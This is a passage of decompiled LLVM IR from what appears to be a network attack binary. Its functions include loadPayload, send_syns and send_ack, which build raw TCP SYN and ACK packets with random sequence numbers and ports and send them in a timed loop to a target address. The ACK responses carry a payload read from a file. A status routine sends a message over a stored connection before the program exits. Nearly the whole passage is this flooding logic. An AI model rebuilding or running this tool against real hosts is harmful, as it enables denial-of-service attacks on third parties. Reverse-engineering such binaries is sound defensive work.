  store i32 %v0_804ded3, i32* %eax.global-to-local, align 4
  %v3_804ded8 = trunc i32 %v0_804ded3 to i16
  %v4_804ded8 = icmp eq i16 %v3_804ded8, 0
  %v1_804dedb = icmp eq i1 %v4_804ded8, false
  br i1 %v1_804dedb, label %dec_label_pc_804deed, label %dec_label_pc_804dedd

dec_label_pc_804dedd:                             ; preds = %dec_label_pc_804deb6
  %v2_804dee0 = inttoptr i32 %v0_804deca to i32*
  store i32 ptrtoint ([14 x i8]* @global_var_8069d37.230 to i32), i32* %v2_804dee0, align 4
  %v2_804dee5 = call i32 @printUsage(i32 %v5_804debc)
  store i32 %v2_804dee5, i32* %eax.global-to-local, align 4
  %v0_804deea = load i32, i32* @esp, align 4
  br label %dec_label_pc_804deed

dec_label_pc_804deed:                             ; preds = %dec_label_pc_804deb6, %dec_label_pc_804dedd
  %v0_804deed.in = phi i32 [ %v0_804deca, %dec_label_pc_804deb6 ], [ %v0_804deea, %dec_label_pc_804dedd ]
  %v1_804def0 = add i32 %v0_804deed.in, 4
  %v2_804def0 = inttoptr i32 %v1_804def0 to i32*
  store i32 ptrtoint (i32* @global_var_807dcc4.202 to i32), i32* %v2_804def0, align 4
  %v6_804def5 = inttoptr i32 %v0_804deed.in to i32*
  store i32 %v2_804de73, i32* %v6_804def5, align 4
  %v2_804def8 = load i32, i32* %stack_var_-4, align 4
  %v4_804def8 = call i32 @inet_aton(i8* %v22_804debc, i32 %v2_804def8)
  store i32 %v4_804def8, i32* %eax.global-to-local, align 4
  %v0_804defd = load i32, i32* @esp, align 4
  %v1_804df00 = icmp eq i32 %v4_804def8, 0
  %v1_804df02 = icmp eq i1 %v1_804df00, false
  br i1 %v1_804df02, label %dec_label_pc_804df14, label %dec_label_pc_804df04

dec_label_pc_804df04:                             ; preds = %dec_label_pc_804deed
  %v2_804df07 = inttoptr i32 %v0_804defd to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_8069d45.231 to i32), i32* %v2_804df07, align 4
  %v2_804df0c = call i32 @printUsage(i32 %v5_804debc)
  store i32 %v2_804df0c, i32* %eax.global-to-local, align 4
  %v0_804df11 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804df14

dec_label_pc_804df14:                             ; preds = %dec_label_pc_804deed, %dec_label_pc_804df04
  %v0_804df14.in = phi i32 [ %v0_804defd, %dec_label_pc_804deed ], [ %v0_804df11, %dec_label_pc_804df04 ]
  %v0_804df17 = load i32, i32* @global_var_807dccc.232, align 4
  %v3_804df17 = inttoptr i32 %v0_804df14.in to i32*
  store i32 %v0_804df17, i32* %v3_804df17, align 4
  %v2_804df1d = call i32 @__GI_inet_ntoa(i32 %v5_804debc)
  %v0_804df22 = load i32, i32* @esp, align 4
  %v5_804df2d = add i32 %stack_var_-16.0, %v5_804ddbe
  store i32 %v5_804df2d, i32* %eax.global-to-local, align 4
  %v1_804df30 = inttoptr i32 %v5_804df2d to i32*
  %v2_804df30 = load i32, i32* %v1_804df30, align 4
  store i32 %v2_804df30, i32* %eax.global-to-local, align 4
  %v2_804df35 = add i32 %v0_804df22, 8
  %v3_804df35 = inttoptr i32 %v2_804df35 to i32*
  store i32 %v2_804df1d, i32* %v3_804df35, align 4
  %v0_804df36 = load i32, i32* %eax.global-to-local, align 4
  %v2_804df36 = add i32 %v0_804df22, 4
  %v3_804df36 = inttoptr i32 %v2_804df36 to i32*
  store i32 %v0_804df36, i32* %v3_804df36, align 4
  %v2_804df37 = inttoptr i32 %v0_804df22 to i32*
  store i32 ptrtoint ([34 x i8]* @global_var_8069d5c.233 to i32), i32* %v2_804df37, align 4
  %v1_804df3c = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  %v0_804df41 = load i32, i32* @esp, align 4
  %v0_804df44 = load i32, i32* @global_var_807dcc0.204, align 64
  %v1_804df49 = urem i32 %v0_804df44, 65536
  store i32 %v1_804df49, i32* %eax.global-to-local, align 4
  %v2_804df51 = add i32 %v0_804df41, 8
  %v3_804df51 = inttoptr i32 %v2_804df51 to i32*
  store i32 %v1_804df49, i32* %v3_804df51, align 4
  %v5_804df52 = add i32 %v0_804df41, 4
  %v6_804df52 = inttoptr i32 %v5_804df52 to i32*
  store i32 %v2_804de73, i32* %v6_804df52, align 4
  %v2_804df55 = inttoptr i32 %v0_804df41 to i32*
  store i32 ptrtoint ([26 x i8]* @global_var_8069d7e.234 to i32), i32* %v2_804df55, align 4
  %v1_804df5a = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  store i32 %v1_804df5a, i32* %eax.global-to-local, align 4
  %v2_804df62 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df62, i32* @ebp, align 4
  ret i32 %v1_804df5a

; uselistorder directives
  uselistorder i32 %v1_804df49, { 1, 0 }
  uselistorder i32 %v0_804df41, { 2, 0, 1 }
  uselistorder i32 %v0_804df22, { 2, 0, 1 }
  uselistorder i8* %storemerge.lcssa, { 1, 0 }
  uselistorder i32 %storemerge.in.lcssa, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804de88, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804de25, { 0, 2, 1 }
  uselistorder i32 %v0_804de17, { 1, 0 }
  uselistorder i32 %v4_804dde8, { 1, 0 }
  uselistorder i32 %v2_804ddcd, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v5_804ddbe, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_804ddb6, { 1, 0 }
  uselistorder i32 %v1_804dda6, { 1, 3, 2, 0 }
  uselistorder i32 %v0_804dda6, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_804dda1, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_804dd97, { 2, 1, 0 }
  uselistorder i32 %v1_804dd5d, { 2, 1, 0 }
  uselistorder i32 %v1_804dd11, { 0, 2, 1 }
  uselistorder i32 %v1_804dcd8, { 0, 2, 1 }
  uselistorder i32 %v1_804dcb3, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 10 }
  uselistorder i32* %stack_var_-4, { 1, 0, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 12, 47, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 48, 42, 43, 46 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df14, { 1, 0 }
  uselistorder label %dec_label_pc_804deed, { 1, 0 }
  uselistorder label %dec_label_pc_804deb6, { 1, 0 }
  uselistorder label %dec_label_pc_804de9d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de94, { 1, 0 }
  uselistorder label %dec_label_pc_804de6a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ddfe, { 1, 0 }
  uselistorder label %dec_label_pc_804dde8, { 1, 0 }
  uselistorder label %dec_label_pc_804dd92, { 4, 2, 1, 3, 0, 5 }
  uselistorder label %dec_label_pc_804dd41, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dd08, { 2, 1, 0 }
}

define i32 @loadPayload() local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v4_804df75 = call i32 @__GI_fopen(i32 %tmp9, i32 ptrtoint ([3 x i8]* @global_var_8069e70.235 to i32))
  %v4_804df80 = icmp eq i32 %v4_804df75, 0
  %v1_804df84 = icmp eq i1 %v4_804df80, false
  br i1 %v1_804df84, label %entry.dec_label_pc_804df96_crit_edge, label %dec_label_pc_804df86

entry.dec_label_pc_804df96_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804df96

dec_label_pc_804df86:                             ; preds = %entry
  %v2_804df8e = call i32 @printUsage(i32 ptrtoint ([28 x i8]* @global_var_8069e73.236 to i32))
  br label %dec_label_pc_804df96

dec_label_pc_804df96:                             ; preds = %entry.dec_label_pc_804df96_crit_edge, %dec_label_pc_804df86
  %v6_804dfa5 = call i32 @fread(i32 ptrtoint (i8** @global_var_807dcdc.237 to i32), i32 1, i32 1000, i32 %v4_804df75)
  store i32 %v6_804dfa5, i32* @global_var_807e0c4.214, align 4
  %tmp17 = inttoptr i32 %v4_804df75 to i32*
  %v3_804dfb8 = call i32 @ferror(i32* %tmp17)
  %v1_804dfc0 = icmp eq i32 %v3_804dfb8, 0
  br i1 %v1_804dfc0, label %dec_label_pc_804dfd4, label %dec_label_pc_804dfc4

dec_label_pc_804dfc4:                             ; preds = %dec_label_pc_804df96
  %v2_804dfcc = call i32 @printUsage(i32 ptrtoint ([28 x i8]* @global_var_8069e73.236 to i32))
  br label %dec_label_pc_804dfd4

dec_label_pc_804dfd4:                             ; preds = %dec_label_pc_804df96, %dec_label_pc_804dfc4
  %v0_804dfd5 = phi i32 [ 0, %dec_label_pc_804df96 ], [ %v2_804dfcc, %dec_label_pc_804dfc4 ]
  ret i32 %v0_804dfd5

; uselistorder directives
  uselistorder i32 %v4_804df75, { 1, 0, 2 }
  uselistorder i32 (i32)* @printUsage, { 7, 6, 5, 4, 3, 2, 1, 0, 11, 10, 9, 8 }
  uselistorder label %dec_label_pc_804dfd4, { 1, 0 }
  uselistorder label %dec_label_pc_804df96, { 1, 0 }
}

define i32 @print_status() local_unnamed_addr {
entry:
  br label %dec_label_pc_804dfdf

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dfdf, %entry
  %v0_804dfdf = load i32, i32* @global_var_807e0f4.212, align 4
  %v0_804dfe4 = load i32, i32* @global_var_807e0f0.211, align 16
  %v0_804dfea = load i32, i32* @global_var_807e0ec.210, align 4
  store i32 %v0_804dfea, i32* @ecx, align 4
  %v0_804dff0 = load i32, i32* @global_var_807e0e8.209, align 8
  store i32 %v0_804dff0, i32* @ebx, align 4
  %v0_804dff6 = load i32, i32* @global_var_807e0e4.208, align 4
  store i32 %v0_804dff6, i32* @esi, align 4
  %v9_804e009 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_8069e90.238, i32 0, i32 0), i32 %v0_804dff6, i32 %v0_804dff0, i32 %v0_804dfea, i32 %v0_804dfe4, i32 %v0_804dfdf)
  %v0_804e011 = load i8*, i8** @global_var_8073d6c, align 4
  %v1_804e011 = ptrtoint i8* %v0_804e011 to i32
  %v2_804e01a = call i32 @fflush(i32 %v1_804e011)
  %v2_804e027 = call i32 @sleep(i32 1)
  %v3_804e034 = call i32 @__GI_time(i32* null)
  %v0_804e03e = load i32, i32* @global_var_807e0c8.215, align 8
  %v0_804e044 = load i32, i32* @global_var_807e0cc.216, align 4
  %v2_804e049 = add i32 %v0_804e044, %v0_804e03e
  %v5_804e04e = icmp slt i32 %v3_804e034, %v2_804e049
  br i1 %v5_804e04e, label %dec_label_pc_804dfdf, label %dec_label_pc_804e050

dec_label_pc_804e050:                             ; preds = %dec_label_pc_804dfdf
  %v0_804e064 = load i32, i32* @global_var_807e0e8.209, align 8
  store i32 %v0_804e064, i32* @ebx, align 4
  %v0_804e06a = load i32, i32* @global_var_807e0e4.208, align 4
  store i32 %v0_804e06a, i32* @esi, align 4
  %v0_804e070 = load i32, i32* @global_var_807e0d4.201, align 4
  store i32 %v0_804e070, i32* @edi, align 4
  %v0_804e076 = load i8*, i8** @global_var_807e0d0.200, align 4
  %v1_804e076 = ptrtoint i8* %v0_804e076 to i32
  %v3_804e08e = call i32 @Send(i32 %v1_804e076, i32 ptrtoint ([85 x i8]* @global_var_8069ed4.239 to i32))
  %v2_804e09b = call i32 @__GI_exit(i32 0)
  ret i32 %v2_804e09b

; uselistorder directives
  uselistorder i8** @global_var_807e0d0.200, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @fflush, { 1, 0 }
}

define i32 @send_syns() local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_804e0b0 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804e0bb = icmp slt i32 %v3_804e0b0, 0
  %v1_804e0bf = icmp eq i1 %v5_804e0bb, false
  br i1 %v1_804e0bf, label %dec_label_pc_804e0db, label %dec_label_pc_804e0c1

dec_label_pc_804e0c1:                             ; preds = %entry
  %v2_804e0c9 = call i32 @perror(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @global_var_8069f2c.240, i32 0, i32 0))
  %v1_804e0d6 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804e0db

dec_label_pc_804e0db:                             ; preds = %entry, %dec_label_pc_804e0c1
  %v3_804e0e9 = call i32 @bind(i32 %v3_804e0b0, i32 ptrtoint (i32* @global_var_807dcc8.227 to i32), i32 16)
  %v10_804e0f1 = icmp eq i32 %v3_804e0e9, -1
  %v1_804e0f4 = icmp eq i1 %v10_804e0f1, false
  br i1 %v1_804e0f4, label %dec_label_pc_804e0db.dec_label_pc_804e110_crit_edge, label %dec_label_pc_804e0f6

dec_label_pc_804e0db.dec_label_pc_804e110_crit_edge: ; preds = %dec_label_pc_804e0db
  br label %dec_label_pc_804e110

dec_label_pc_804e0f6:                             ; preds = %dec_label_pc_804e0db
  %v2_804e0fe = call i32 @perror(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_8069f54.241, i32 0, i32 0))
  %v1_804e10b = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804e110

dec_label_pc_804e110:                             ; preds = %dec_label_pc_804e0db.dec_label_pc_804e110_crit_edge, %dec_label_pc_804e0f6
  store i32 2, i32* %stack_var_-60, align 4
  %v0_804e116 = load i32, i32* @global_var_807dcc4.202, align 4
  %v1_804e136 = call i32 @htons(i32 24576)
  %sext = mul i32 %v1_804e136, 65536
  %v4_804e144 = sdiv i32 %sext, 65536
  store i32 %v4_804e144, i32* @ebx, align 4
  %v1_804e14c = call i32 @htons(i32 2)
  %v0_804e15a = load i32, i32* @global_var_807dcc0.204, align 64
  %v1_804e15f = urem i32 %v0_804e15a, 65536
  %v1_804e168 = call i32 @htons(i32 %v1_804e15f)
  %v2_804e1be = ptrtoint i32* %stack_var_-44 to i32
  %v4_804e1cd = bitcast i32* %stack_var_-44 to i8*
  %v2_804e1d5 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_804e188

dec_label_pc_804e188:                             ; preds = %dec_label_pc_804e254, %dec_label_pc_804e110
  %storemerge = phi i32 [ %v4_804e254, %dec_label_pc_804e254 ], [ 0, %dec_label_pc_804e110 ]
  %v0_804e188 = call i32 @random()
  %v2_804e19b = or i32 %v0_804e188, -32768
  store i32 %v2_804e19b, i32* %stack_var_-44, align 4
  %v1_804e1a1 = call i32 @random()
  %v1_804e1aa = call i32 @htonl(i32 %v1_804e1a1)
  %v1_804e1b5 = call i32 @random()
  %v0_804e1c4 = load i32, i32* @global_var_807dccc.232, align 4
  %v5_804e1cd = call i32 @calc_tcp_checksum(i8* %v4_804e1cd, i32 24, i32 %v0_804e1c4, i32 %v0_804e116)
  %v6_804e1e9 = call i32 @sendto(i32 %v3_804e0b0, i32 %v2_804e1be, i32 24, i32 0, i32 %v2_804e1d5, i32 16)
  %v13_804e1f4 = icmp eq i32 %v6_804e1e9, -1
  %v1_804e1f8 = icmp eq i1 %v13_804e1f4, false
  br i1 %v1_804e1f8, label %dec_label_pc_804e20a, label %dec_label_pc_804e1fa

dec_label_pc_804e1fa:                             ; preds = %dec_label_pc_804e188
  %v2_804e202 = call i32 @perror(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_8069f7a.242, i32 0, i32 0))
  br label %dec_label_pc_804e20a

dec_label_pc_804e20a:                             ; preds = %dec_label_pc_804e188, %dec_label_pc_804e1fa
  %v0_804e20a = load i32, i32* @global_var_807e0e4.208, align 4
  %v1_804e20f = add i32 %v0_804e20a, 1
  store i32 %v1_804e20f, i32* @global_var_807e0e4.208, align 4
  %v0_804e215 = load i32, i32* @global_var_807dcd8.213, align 8
  %v1_804e21e = sext i32 %v0_804e215 to i64
  %v2_804e21e = call i32 @usleep(i64 %v1_804e21e)
  %v7_804e22a = icmp sgt i32 %storemerge, 99
  br i1 %v7_804e22a, label %dec_label_pc_804e22c, label %dec_label_pc_804e254

dec_label_pc_804e22c:                             ; preds = %dec_label_pc_804e20a
  %v2_804e231 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e231, i32* @ecx, align 4
  %v0_804e23b = load i32, i32* @global_var_807e0c8.215, align 8
  %v0_804e241 = load i32, i32* @global_var_807e0cc.216, align 4
  %v2_804e246 = add i32 %v0_804e241, %v0_804e23b
  %v5_804e24b = icmp slt i32 %v2_804e231, %v2_804e246
  br i1 %v5_804e24b, label %dec_label_pc_804e254, label %dec_label_pc_804e25c

dec_label_pc_804e254:                             ; preds = %dec_label_pc_804e22c, %dec_label_pc_804e20a
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804e20a ], [ 0, %dec_label_pc_804e22c ]
  %v4_804e254 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804e188

dec_label_pc_804e25c:                             ; preds = %dec_label_pc_804e22c
  ret i32 %v2_804e246

; uselistorder directives
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder label %dec_label_pc_804e20a, { 1, 0 }
  uselistorder label %dec_label_pc_804e110, { 1, 0 }
  uselistorder label %dec_label_pc_804e0db, { 1, 0 }
}

define i32 @send_ack(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1052 = alloca i32, align 4
  %stack_var_-1076 = alloca i32, align 4
  %v0_804e264 = load i32, i32* @edi, align 4
  %v0_804e265 = load i32, i32* @esi, align 4
  %v0_804e266 = load i32, i32* @ebx, align 4
  %v0_804e26d = load i32, i32* @global_var_806f720.243, align 32
  %v10_804e272 = icmp eq i32 %v0_804e26d, -1
  %v1_804e275 = icmp eq i1 %v10_804e272, false
  br i1 %v1_804e275, label %entry.dec_label_pc_804e2e9_crit_edge, label %dec_label_pc_804e277

entry.dec_label_pc_804e2e9_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804e2e9

dec_label_pc_804e277:                             ; preds = %entry
  %v3_804e280 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804e280, i32* @global_var_806f720.243, align 32
  %v2_804e292 = icmp slt i32 %v3_804e280, 0
  %v1_804e294 = icmp eq i1 %v2_804e292, false
  br i1 %v1_804e294, label %dec_label_pc_804e2b0, label %dec_label_pc_804e296

dec_label_pc_804e296:                             ; preds = %dec_label_pc_804e277
  %v2_804e29e = call i32 @perror(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @global_var_8069f98.244, i32 0, i32 0))
  %v1_804e2ab = call i32 @__GI_exit(i32 -1)
  %v0_804e2b5.pre = load i32, i32* @global_var_806f720.243, align 32
  br label %dec_label_pc_804e2b0

dec_label_pc_804e2b0:                             ; preds = %dec_label_pc_804e277, %dec_label_pc_804e296
  %v0_804e2b5 = phi i32 [ %v3_804e280, %dec_label_pc_804e277 ], [ %v0_804e2b5.pre, %dec_label_pc_804e296 ]
  %v3_804e2c2 = call i32 @bind(i32 %v0_804e2b5, i32 ptrtoint (i32* @global_var_807dcc8.227 to i32), i32 16)
  %v10_804e2ca = icmp eq i32 %v3_804e2c2, -1
  %v1_804e2cd = icmp eq i1 %v10_804e2ca, false
  br i1 %v1_804e2cd, label %dec_label_pc_804e2e9, label %dec_label_pc_804e2cf

dec_label_pc_804e2cf:                             ; preds = %dec_label_pc_804e2b0
  %v2_804e2d7 = call i32 @perror(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @global_var_8069fc8.245, i32 0, i32 0))
  %v1_804e2e4 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804e2e9

dec_label_pc_804e2e9:                             ; preds = %entry.dec_label_pc_804e2e9_crit_edge, %dec_label_pc_804e2b0, %dec_label_pc_804e2cf
  store i32 2, i32* %stack_var_-52, align 4
  %v0_804e2ef = load i32, i32* @global_var_807dcc4.202, align 4
  %v4_804e2fd = ptrtoint i16* %arg1 to i32
  %v1_804e300 = bitcast i16* %arg1 to i8*
  %v2_804e300 = load i8, i8* %v1_804e300, align 1
  %v3_804e300 = zext i8 %v2_804e300 to i32
  %v1_804e307 = mul nuw nsw i32 %v3_804e300, 4
  %v2_804e30a = and i32 %v1_804e307, 60
  %v6_804e30d = add i32 %v2_804e30a, %v4_804e2fd
  %v5_804e310 = inttoptr i32 %v6_804e30d to i16*
  %v2_804e313 = ptrtoint i32* %stack_var_-1076 to i32
  %tmp29 = bitcast i32* %stack_var_-1076 to i16*
  %v1_804e31f = add i32 %v6_804e30d, 2
  %v2_804e31f = inttoptr i32 %v1_804e31f to i16*
  %v3_804e31f = load i16, i16* %v2_804e31f, align 2
  store i16 %v3_804e31f, i16* %tmp29, align 4
  %v2_804e32c = load i16, i16* %v5_804e310, align 2
  %v3_804e332 = or i32 %v2_804e313, 2
  %v4_804e332 = inttoptr i32 %v3_804e332 to i16*
  store i16 %v2_804e32c, i16* %v4_804e332, align 2
  %v1_804e339 = add i32 %v6_804e30d, 4
  %v2_804e339 = inttoptr i32 %v1_804e339 to i32*
  %v3_804e339 = load i32, i32* %v2_804e339, align 4
  %v2_804e33f = add i32 %v2_804e313, 8
  %v3_804e33f = inttoptr i32 %v2_804e33f to i32*
  store i32 %v3_804e339, i32* %v3_804e33f, align 4
  %v1_804e345 = add i32 %v6_804e30d, 8
  %v2_804e345 = inttoptr i32 %v1_804e345 to i32*
  %v3_804e345 = load i32, i32* %v2_804e345, align 4
  %v2_804e34b = add i32 %v2_804e313, 4
  %v3_804e34b = inttoptr i32 %v2_804e34b to i32*
  store i32 %v3_804e345, i32* %v3_804e34b, align 4
  %v1_804e351 = add i32 %v2_804e313, 12
  %v2_804e351 = inttoptr i32 %v1_804e351 to i16*
  store i16 0, i16* %v2_804e351, align 4
  %v5_804e35a = load i32, i32* @ebx, align 4
  %v6_804e35a = and i32 %v5_804e35a, -65536
  store i32 %v6_804e35a, i32* %ebx.global-to-local, align 4
  %v1_804e366 = call i32 @htons(i32 24576)
  %v1_804e375 = trunc i32 %v1_804e366 to i16
  store i16 %v1_804e375, i16* %v2_804e351, align 4
  %v4_804e37c = and i32 %v1_804e366, 65535
  %v5_804e37c = load i32, i32* %ebx.global-to-local, align 4
  %v6_804e37c = and i32 %v5_804e37c, -65536
  %v7_804e37c = or i32 %v6_804e37c, %v4_804e37c
  store i32 %v7_804e37c, i32* %ebx.global-to-local, align 4
  %v1_804e385 = call i32 @htons(i32 16)
  %v2_804e38f = or i32 %v1_804e366, %v1_804e385
  %v1_804e394 = trunc i32 %v2_804e38f to i16
  store i16 %v1_804e394, i16* %v2_804e351, align 4
  %v1_804e39b = add i32 %v2_804e313, 14
  %v2_804e39b = inttoptr i32 %v1_804e39b to i16*
  store i16 0, i16* %v2_804e39b, align 2
  %v1_804e3a4 = add i32 %v2_804e313, 18
  %v2_804e3a4 = inttoptr i32 %v1_804e3a4 to i16*
  store i16 0, i16* %v2_804e3a4, align 2
  %v1_804e3ad = add i32 %v2_804e313, 20
  %v2_804e3ad = inttoptr i32 %v1_804e3ad to i32*
  store i32 0, i32* %v2_804e3ad, align 4
  %v1_804e3be = add i32 %v6_804e30d, 12
  %v2_804e3be = inttoptr i32 %v1_804e3be to i16*
  %v3_804e3be = load i16, i16* %v2_804e3be, align 2
  %v4_804e3be = zext i16 %v3_804e3be to i32
  %v5_804e3be = load i32, i32* %ebx.global-to-local, align 4
  %v6_804e3be = and i32 %v5_804e3be, -65536
  %v7_804e3be = or i32 %v6_804e3be, %v4_804e3be
  store i32 %v7_804e3be, i32* @ebx, align 4
  %v1_804e3c7 = call i32 @htons(i32 16)
  %v1_804e3cf = load i32, i32* @ebx, align 4
  %v2_804e3cf = and i32 %v1_804e3cf, %v1_804e3c7
  %v3_804e3d1 = trunc i32 %v2_804e3cf to i16
  %v4_804e3d1 = icmp eq i16 %v3_804e3d1, 0
  br i1 %v4_804e3d1, label %dec_label_pc_804e447, label %dec_label_pc_804e3d6

dec_label_pc_804e3d6:                             ; preds = %dec_label_pc_804e2e9
  %v3_804e3d9 = load i16, i16* %v2_804e3be, align 2
  %v4_804e3d9 = zext i16 %v3_804e3d9 to i32
  %v6_804e3d9 = and i32 %v1_804e3cf, -65536
  %v7_804e3d9 = or i32 %v4_804e3d9, %v6_804e3d9
  store i32 %v7_804e3d9, i32* @ebx, align 4
  %v1_804e3e2 = call i32 @htons(i32 2)
  %v1_804e3ea = load i32, i32* @ebx, align 4
  %v2_804e3ea = and i32 %v1_804e3ea, %v1_804e3e2
  %v3_804e3ec = trunc i32 %v2_804e3ea to i16
  %v4_804e3ec = icmp eq i16 %v3_804e3ec, 0
  br i1 %v4_804e3ec, label %dec_label_pc_804e447, label %dec_label_pc_804e3f1

dec_label_pc_804e3f1:                             ; preds = %dec_label_pc_804e3d6
  %v3_804e3f4 = load i32, i32* %v2_804e339, align 4
  %v1_804e3fb = call i32 @ntohl(i32 %v3_804e3f4)
  %v1_804e403 = add i32 %v1_804e3fb, 1
  %v1_804e408 = call i32 @htonl(i32 %v1_804e403)
  store i32 %v1_804e408, i32* %v3_804e33f, align 4
  %v3_804e41b = load i32, i32* %v2_804e345, align 4
  store i32 %v3_804e41b, i32* %v3_804e34b, align 4
  %v0_804e424 = load i32, i32* @global_var_807e0c4.214, align 4
  %v15_804e430 = ptrtoint i32* %stack_var_-1052 to i32
  %tmp30 = bitcast i32* %stack_var_-1052 to i8*
  store i32 %v15_804e430, i32* @edi, align 4
  store i32 ptrtoint (i8** @global_var_807dcdc.237 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e43d = call i8* @_memcpy(i8* %tmp30, i8* bitcast (i8** @global_var_807dcdc.237 to i8*), i32 %v0_804e424)
  %v8_804e43d = ptrtoint i8* %v7_804e43d to i32
  store i32 %v8_804e43d, i32* @ecx, align 4
  %v0_804e43f = load i32, i32* @global_var_807e0c4.214, align 4
  %v5_804e444 = add i32 %v0_804e43f, 24
  br label %dec_label_pc_804e447

dec_label_pc_804e447:                             ; preds = %dec_label_pc_804e3d6, %dec_label_pc_804e2e9, %dec_label_pc_804e3f1
  %stack_var_-24.0 = phi i32 [ 24, %dec_label_pc_804e2e9 ], [ 24, %dec_label_pc_804e3d6 ], [ %v5_804e444, %dec_label_pc_804e3f1 ]
  %v0_804e44a = load i32, i32* @global_var_807dccc.232, align 4
  %v4_804e45a = bitcast i32* %stack_var_-1076 to i8*
  %v5_804e45a = call i32 @calc_tcp_checksum(i8* %v4_804e45a, i32 %stack_var_-24.0, i32 %v0_804e44a, i32 %v0_804e2ef)
  %v2_804e462 = ptrtoint i32* %stack_var_-52 to i32
  %v0_804e465 = load i32, i32* @global_var_806f720.243, align 32
  %v6_804e47e = call i32 @sendto(i32 %v0_804e465, i32 %v2_804e313, i32 %stack_var_-24.0, i32 0, i32 %v2_804e462, i32 16)
  %v13_804e489 = icmp eq i32 %v6_804e47e, -1
  %v1_804e48d = icmp eq i1 %v13_804e489, false
  br i1 %v1_804e48d, label %dec_label_pc_804e49f, label %dec_label_pc_804e48f

dec_label_pc_804e48f:                             ; preds = %dec_label_pc_804e447
  %v2_804e497 = call i32 @perror(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_8069ff4.246, i32 0, i32 0))
  br label %dec_label_pc_804e49f

dec_label_pc_804e49f:                             ; preds = %dec_label_pc_804e447, %dec_label_pc_804e48f
  %v0_804e4a6 = phi i32 [ %v6_804e47e, %dec_label_pc_804e447 ], [ %v2_804e497, %dec_label_pc_804e48f ]
  store i32 %v0_804e266, i32* @ebx, align 4
  store i32 %v0_804e265, i32* @esi, align 4
  store i32 %v0_804e264, i32* @edi, align 4
  ret i32 %v0_804e4a6

; uselistorder directives
  uselistorder i32 %v6_804e47e, { 1, 0 }
  uselistorder i32 %v1_804e3cf, { 1, 0 }
  uselistorder i32 %v3_804e280, { 0, 2, 1 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_807dcdc.237 to i32), { 1, 0 }
  uselistorder i32* @global_var_806f720.243, { 1, 0, 2, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e49f, { 1, 0 }
  uselistorder label %dec_label_pc_804e447, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e2e9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e2b0, { 1, 0 }
}

define i32 @process_incoming() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-10064 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-10092 = alloca i8*, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-10076 = alloca i32, align 4
  %v15_804e4ab = ptrtoint i32* %stack_var_-10076 to i32
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-10092, align 4
  %v4_804e4ba = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804e4c5 = icmp slt i32 %v4_804e4ba, 0
  %v1_804e4c9 = icmp eq i1 %v5_804e4c5, false
  br i1 %v1_804e4c9, label %dec_label_pc_804e4e5, label %dec_label_pc_804e4cb

dec_label_pc_804e4cb:                             ; preds = %entry
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @global_var_806a018.247, i32 0, i32 0), i8** %stack_var_-10092, align 4
  %v3_804e4d3 = call i32 @perror(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @global_var_806a018.247, i32 0, i32 0))
